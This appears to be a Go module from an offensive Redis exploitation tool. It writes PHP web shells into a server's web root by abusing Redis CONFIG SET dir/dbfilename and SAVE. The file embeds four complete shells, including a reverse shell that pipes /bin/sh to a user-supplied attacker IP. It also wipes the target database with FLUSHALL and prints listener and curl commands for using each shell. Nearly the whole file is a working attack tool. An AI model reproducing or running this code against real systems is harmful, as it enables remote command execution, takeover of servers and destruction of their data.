package exploitation

import (
	"0xRedisis/modules/core"
	"bufio"
	"fmt"
	"os"
	"strings"
)

func WebShellInjection(client *core.RedisClient) {
	fmt.Printf("\n%s=== Web Shell Injection ===%s\n", core.ColorBlue, core.ColorNC)

	// Get current working directory
	dir, err := client.SendCommand("CONFIG", "GET", "dir")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get Redis directory: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[*]%s Current Redis directory: %s\n", core.ColorBlue, core.ColorNC, parseConfigValue(dir, "dir"))

	// Show webshell options
	fmt.Printf("\n%s[*]%s Select web shell type:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Simple command shell (cmd parameter)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Interactive PHP shell\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Reverse shell payload\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Custom shell\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Advanced web shell with file manager\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-5): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	var shellContent string
	var filename string

	switch choice {
	case "1":
		shellContent = getSimpleShell()
		filename = "shell.php"
	case "2":
		shellContent = getInteractiveShell()
		filename = "interactive.php"
	case "3":
		shellContent = getReverseShell(reader)
		filename = "reverse.php"
	case "4":
		shellContent = getCustomShell(reader)
		filename = getCustomFilename(reader)
	case "5":
		shellContent = getAdvancedShell()
		filename = "manager.php"
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
		return
	}

	// Get target web directory
	webPath := getWebPath(reader)
	fullPath := webPath + "/" + filename

	fmt.Printf("\n%s[*]%s Attempting to inject web shell...\n", core.ColorBlue, core.ColorNC)

	if err := injectShellToPath(client, shellContent, fullPath); err != nil {
		fmt.Printf("%s[-]%s Failed to inject shell: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Web shell injected successfully!\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s[+]%s Shell location: %s%s%s\n", core.ColorGreen, core.ColorNC, core.ColorYellow, fullPath, core.ColorNC)
	fmt.Printf("%s[+]%s URL (estimate): %shttp://%s/%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, client.Config.Host, filename, core.ColorNC)

	// Show usage instructions
	showUsageInstructions(choice, filename, client.Config.Host)
}

func getSimpleShell() string {
	return `<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $output = shell_exec($_GET['cmd'] . " 2>&1");
    echo htmlspecialchars($output);
    echo "</pre>";
} else {
    echo "<h2>Simple Web Shell</h2>";
    echo "<p>Usage: ?cmd=&lt;command&gt;</p>";
    echo "<form method='get'>";
    echo "Command: <input type='text' name='cmd' placeholder='whoami' autofocus>";
    echo " <input type='submit' value='Execute'>";
    echo "</form>";
}
?>`
}

func getInteractiveShell() string {
	return `<?php
echo "<h2>Interactive PHP Shell</h2>";
echo "<style>body{font-family:monospace;background:#1e1e1e;color:#fff;} input,textarea{background:#333;color:#fff;border:1px solid #666;padding:5px;} pre{background:#000;padding:10px;border-radius:5px;}</style>";

echo "<form method='post'>";
echo "Command: <input type='text' name='cmd' size='80' autofocus placeholder='ls -la'>";
echo " <input type='submit' value='Execute'><br><br>";
echo "Working Directory: <input type='text' name='dir' value='" . getcwd() . "' size='60'>";
echo "</form>";

if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
    
    echo "<hr>";
    echo "<pre>";
    echo "<strong>$ " . htmlspecialchars($cmd) . "</strong>\n";
    
    if($dir !== getcwd()) {
        chdir($dir);
    }
    
    $output = shell_exec($cmd . " 2>&1");
    echo htmlspecialchars($output);
    echo "</pre>";
}

echo "<hr>";
echo "<strong>System Info:</strong><br>";
echo "Current directory: " . getcwd() . "<br>";
echo "PHP version: " . phpversion() . "<br>";
echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
echo "User: " . get_current_user() . "<br>";
echo "OS: " . PHP_OS . "<br>";
?>`
}

func getReverseShell(reader *bufio.Reader) string {
	fmt.Print("Enter your IP address: ")
	ip, _ := reader.ReadString('\n')
	ip = strings.TrimSpace(ip)

	fmt.Print("Enter port number: ")
	port, _ := reader.ReadString('\n')
	port = strings.TrimSpace(port)

	// Auto-detect local IP if not provided
	if ip == "" {
		ip = core.GetLocalIP()
		fmt.Printf("%s[*]%s Using auto-detected IP: %s\n", core.ColorBlue, core.ColorNC, ip)
	}

	return fmt.Sprintf(`<?php
$ip = '%s';
$port = %s;

echo "<h2>PHP Reverse Shell</h2>";
echo "<p>Connecting to $ip:$port...</p>";

set_time_limit(0);
$sock = fsockopen($ip, $port);
if (!$sock) {
    die("<p style='color:red'>Cannot connect to $ip:$port</p>");
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"), 
   2 => array("pipe", "w")
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (is_resource($process)) {
    fwrite($sock, "Connected to PHP reverse shell\n");
    fwrite($sock, "OS: " . PHP_OS . "\n");
    fwrite($sock, "User: " . get_current_user() . "\n");
    fwrite($sock, "PWD: " . getcwd() . "\n\n");
    
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    
    while (true) {
        if (feof($sock)) break;
        if (feof($pipes[1])) break;
        
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, 0);
        
        if (in_array($sock, $read_a)) {
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
        }
        
        if (in_array($pipes[1], $read_a)) {
            $input = fread($pipes[1], 1024);
            fwrite($sock, $input);
        }
        
        if (in_array($pipes[2], $read_a)) {
            $input = fread($pipes[2], 1024);
            fwrite($sock, $input);
        }
    }
    
    fclose($sock);
    proc_close($process);
}
echo "<p>Connection closed.</p>";
?>`, ip, port)
}

func getCustomShell(reader *bufio.Reader) string {
	fmt.Println("Enter your custom PHP shell code (end with ';;;' on a new line):")
	var shellContent strings.Builder

	for {
		line, _ := reader.ReadString('\n')
		if strings.TrimSpace(line) == ";;;" {
			break
		}
		shellContent.WriteString(line)
	}

	return shellContent.String()
}

func getAdvancedShell() string {
	return `<?php
echo "<h1>Advanced Web Shell & File Manager</h1>";
echo "<style>
body{font-family:Arial;background:#f0f0f0;margin:20px;}
.container{background:white;padding:20px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
input,textarea,select{padding:8px;border:1px solid #ddd;border-radius:4px;margin:5px;}
button{padding:8px 15px;background:#007cba;color:white;border:none;border-radius:4px;cursor:pointer;}
button:hover{background:#005a87;}
pre{background:#f8f8f8;padding:15px;border-radius:5px;border-left:4px solid #007cba;overflow-x:auto;}
.file{margin:5px 0;padding:5px;background:#f9f9f9;border-radius:3px;}
.dir{color:#007cba;font-weight:bold;}
</style>";

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if(!is_dir($dir)) $dir = getcwd();

echo "<div class='container'>";

// File manager section
echo "<h2>üìÅ File Manager</h2>";
echo "<form method='get'>";
echo "Current Directory: <input type='text' name='dir' value='$dir' size='80'>";
echo " <button type='submit'>Browse</button>";
echo "</form>";

echo "<div style='margin:10px 0;'>";
$files = scandir($dir);
foreach($files as $file) {
    if($file === '..' && $dir !== '/') {
        $parent = dirname($dir);
        echo "<div class='file dir'><a href='?dir=$parent'>üìÅ ..</a></div>";
    } elseif($file !== '.' && $file !== '..') {
        $fullpath = $dir . DIRECTORY_SEPARATOR . $file;
        if(is_dir($fullpath)) {
            echo "<div class='file dir'><a href='?dir=$fullpath'>üìÅ $file</a></div>";
        } else {
            $size = filesize($fullpath);
            $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
            echo "<div class='file'>üìÑ $file ($size bytes, $perm)</div>";
        }
    }
}
echo "</div>";

// Command execution section
echo "<h2>üíª Command Execution</h2>";
echo "<form method='post'>";
echo "Command: <input type='text' name='cmd' size='80' placeholder='ls -la' autofocus>";
echo " <button type='submit'>Execute</button><br>";
echo "Working Dir: <input type='text' name='workdir' value='$dir' size='60'>";
echo "</form>";

if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $workdir = isset($_POST['workdir']) ? $_POST['workdir'] : $dir;
    
    echo "<h3>Output:</h3>";
    echo "<pre>";
    echo "<strong>$ " . htmlspecialchars($cmd) . "</strong>\n";
    
    $old_dir = getcwd();
    chdir($workdir);
    $output = shell_exec($cmd . " 2>&1");
    chdir($old_dir);
    
    echo htmlspecialchars($output);
    echo "</pre>";
}

// System information
echo "<h2>‚ÑπÔ∏è System Information</h2>";
echo "<pre>";
echo "PHP Version: " . phpversion() . "\n";
echo "Server Software: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
echo "Current User: " . get_current_user() . "\n";
echo "Current Directory: " . getcwd() . "\n";
echo "Operating System: " . PHP_OS . "\n";
echo "Server Name: " . $_SERVER['SERVER_NAME'] . "\n";
echo "Server IP: " . $_SERVER['SERVER_ADDR'] . "\n";
echo "Client IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
echo "</pre>";

echo "</div>";
?>`
}

func getCustomFilename(reader *bufio.Reader) string {
	fmt.Print("Enter filename (with .php extension): ")
	filename, _ := reader.ReadString('\n')
	return strings.TrimSpace(filename)
}

func getWebPath(reader *bufio.Reader) string {
	fmt.Printf("\n%s[*]%s Common web directories to try:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s /var/www/html (Apache default)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s /var/www (Apache)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s /usr/share/nginx/html (Nginx)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s /home/www-data (Custom)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s /opt/lampp/htdocs (XAMPP)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s6.%s Custom path\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-6): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		return "/var/www/html"
	case "2":
		return "/var/www"
	case "3":
		return "/usr/share/nginx/html"
	case "4":
		return "/home/www-data"
	case "5":
		return "/opt/lampp/htdocs"
	case "6":
		fmt.Print("Enter custom web path: ")
		path, _ := reader.ReadString('\n')
		return strings.TrimSpace(path)
	default:
		return "/var/www/html"
	}
}

func injectShellToPath(client *core.RedisClient, content, path string) error {
	// Clear any existing data
	_, err := client.SendCommand("FLUSHALL")
	if err != nil {
		return fmt.Errorf("failed to flush database: %v", err)
	}

	// Set the shell content
	_, err = client.SendCommand("SET", "shell", content)
	if err != nil {
		return fmt.Errorf("failed to set shell content: %v", err)
	}

	// Get directory from path
	pathParts := strings.Split(path, "/")
	dir := strings.Join(pathParts[:len(pathParts)-1], "/")
	filename := pathParts[len(pathParts)-1]

	// Configure Redis to save to target directory
	_, err = client.SendCommand("CONFIG", "SET", "dir", dir)
	if err != nil {
		return fmt.Errorf("failed to set directory: %v", err)
	}

	_, err = client.SendCommand("CONFIG", "SET", "dbfilename", filename)
	if err != nil {
		return fmt.Errorf("failed to set filename: %v", err)
	}

	// Save database to disk
	_, err = client.SendCommand("SAVE")
	if err != nil {
		return fmt.Errorf("failed to save to disk: %v", err)
	}

	return nil
}

func parseConfigValue(response, key string) string {
	lines := strings.Split(response, "\n")
	for i, line := range lines {
		if strings.TrimSpace(line) == key && i+1 < len(lines) {
			return strings.TrimSpace(lines[i+1])
		}
	}
	return "unknown"
}

func showUsageInstructions(choice, filename, host string) {
	fmt.Printf("\n%s=== Usage Instructions ===%s\n", core.ColorBlue, core.ColorNC)

	switch choice {
	case "1":
		fmt.Printf("%s[*]%s Simple Shell Usage:\n", core.ColorBlue, core.ColorNC)
		fmt.Printf("   %shttp://%s/%s?cmd=whoami%s\n", core.ColorYellow, host, filename, core.ColorNC)
		fmt.Printf("   %shttp://%s/%s?cmd=ls+-la%s\n", core.ColorYellow, host, filename, core.ColorNC)
	case "2":
		fmt.Printf("%s[*]%s Interactive Shell Usage:\n", core.ColorBlue, core.ColorNC)
		fmt.Printf("   %sOpen: http://%s/%s%s\n", core.ColorYellow, host, filename, core.ColorNC)
		fmt.Printf("   %sUse the web form to execute commands%s\n", core.ColorYellow, core.ColorNC)
	case "3":
		fmt.Printf("%s[*]%s Reverse Shell Usage:\n", core.ColorBlue, core.ColorNC)
		fmt.Printf("   %sStart listener first: nc -lvnp <port>%s\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("   %sThen visit: http://%s/%s%s\n", core.ColorYellow, host, filename, core.ColorNC)
	case "5":
		fmt.Printf("%s[*]%s Advanced Shell Usage:\n", core.ColorBlue, core.ColorNC)
		fmt.Printf("   %sOpen: http://%s/%s%s\n", core.ColorYellow, host, filename, core.ColorNC)
		fmt.Printf("   %sFeatures: File manager, command execution, system info%s\n", core.ColorYellow, core.ColorNC)
	}

	fmt.Printf("\n%s[*]%s Alternative access methods:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %scurl http://%s/%s?cmd=id%s\n", core.ColorYellow, host, filename, core.ColorNC)
	fmt.Printf("   %swget -qO- \"http://%s/%s?cmd=uname+-a\"%s\n", core.ColorYellow, host, filename, core.ColorNC)
}
